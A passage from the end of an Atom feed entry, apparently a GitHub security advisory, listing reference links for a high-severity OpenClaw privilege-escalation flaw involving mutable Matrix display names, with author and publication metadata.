<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53811">https://nvd.nist.gov/vuln/detail/CVE-2026-53811</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-display-names-in-matrix-allowfrom">https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-mutable-display-names-in-matrix-allowfrom</a></li>
<li><a href="https://github.com/advisories/GHSA-7hxm-f538-3xp6">https://github.com/advisories/GHSA-7hxm-f538-3xp6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hxm-f538-3xp6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:13:58.000Z</published>
    </entry>
</feed>